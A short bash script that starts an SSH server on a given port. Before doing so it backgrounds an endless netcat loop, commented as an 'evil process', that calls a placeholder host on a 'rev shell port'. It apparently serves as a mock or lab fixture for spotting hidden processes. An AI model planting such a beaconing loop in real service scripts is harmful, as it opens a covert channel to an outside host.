#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <listen port> <rev shell port>"
    exit 1
fi

LISTEN_PORT=$1
REV_SHELL_PORT=$2

# start some evil process
while true; do
    nc ev1l-Pr0c-h1der $REV_SHELL_PORT
    sleep 1
done &

echo "[INFO] Starting SSH server on port $LISTEN_PORT"
/usr/sbin/sshd -D -p $LISTEN_PORT